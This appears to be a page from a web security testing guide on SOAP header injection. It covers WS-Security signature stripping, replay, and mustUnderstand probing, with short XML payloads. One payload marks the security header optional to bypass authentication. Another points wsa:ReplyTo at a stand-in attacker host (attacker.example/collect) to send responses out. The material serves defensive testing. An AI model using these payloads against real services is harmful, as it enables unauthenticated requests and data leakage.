---
title: "SOAP header element injection"
order: 3
description: "WS-Addressing, WS-Security, and custom SOAP headers parsed from a partially trusted message expose replay, signature stripping, and mustUnderstand handling bugs in application middleware."
keywords:
  - SOAP header injection
  - WS-Security
  - WS-Addressing
  - mustUnderstand
  - signature stripping
---

# Header element injection

The SOAP Header carries the out-of-band concerns of a message: addressing (WS-Addressing), security tokens and signatures (WS-Security), correlation, and custom application headers. Middleware processes these before the body reaches the handler, and because headers come from the same partially trusted message as the body, a server that mis-handles them can be made to accept replayed, re-routed, or unsigned requests.

## Signature scope and stripping

WS-Security signs selected elements, and the guarantee only covers what was actually signed. When the server verifies that a signature is valid but does not confirm it covers the elements the logic relies on, an attacker keeps a valid signature over a harmless element and alters or adds an unsigned one. Where processing continues even after a security header is removed, the signature is stripped entirely:

```xml
<soap:Header>
  <wsse:Security soap:mustUnderstand="0">
    <!-- security header marked optional so a lenient server skips it -->
  </wsse:Security>
</soap:Header>
```

Setting `mustUnderstand="0"` on a security header invites a server that treats understanding as optional to ignore it, so a request that should have been rejected for missing or invalid security is processed unauthenticated.

## Addressing and replay

WS-Addressing headers (`wsa:To`, `wsa:Action`, `wsa:ReplyTo`, `wsa:MessageID`) steer where a response goes and identify the message. A server that trusts `wsa:ReplyTo` sends responses to an attacker-chosen endpoint, and one that does not track `wsa:MessageID` allows a captured, validly signed message to be replayed:

```xml
<soap:Header xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <wsa:Action>urn:Transfer</wsa:Action>
  <wsa:ReplyTo><wsa:Address>http://attacker.example/collect</wsa:Address></wsa:ReplyTo>
</soap:Header>
```

## mustUnderstand confusion

The `mustUnderstand` attribute tells the server whether a header is mandatory. Toggling it probes the middleware: a header the server should enforce but which it skips when `mustUnderstand="0"` reveals optional enforcement, while a header the server rejects as not-understood when `mustUnderstand="1"` maps which processors are active.

## Confirming the flaw

Manipulate each header class and watch the decision: strip or make the security header optional and see if the call still processes; alter an unsigned element while keeping a valid signature over a signed one and see if the change takes effect; set `wsa:ReplyTo` to an attacker endpoint and watch for an out-of-band hit; replay a captured signed message and see if it is accepted twice. Each success shows the middleware trusts header content it did not bind to the request's identity or integrity.

## Tools

- **Burp Repeater**: stripping security headers, toggling mustUnderstand, and replaying signed messages.
- **SoapUI**: composing and manipulating WS-Security and WS-Addressing headers.
- **Wsdler (Burp extension)**: turning a WSDL into requests to edit in Burp.

## References

- [OASIS: WS-Security](https://docs.oasis-open.org/wss/v1.1/)
- [OWASP: Testing for SOAP](https://owasp.org/www-project-web-security-testing-guide/)
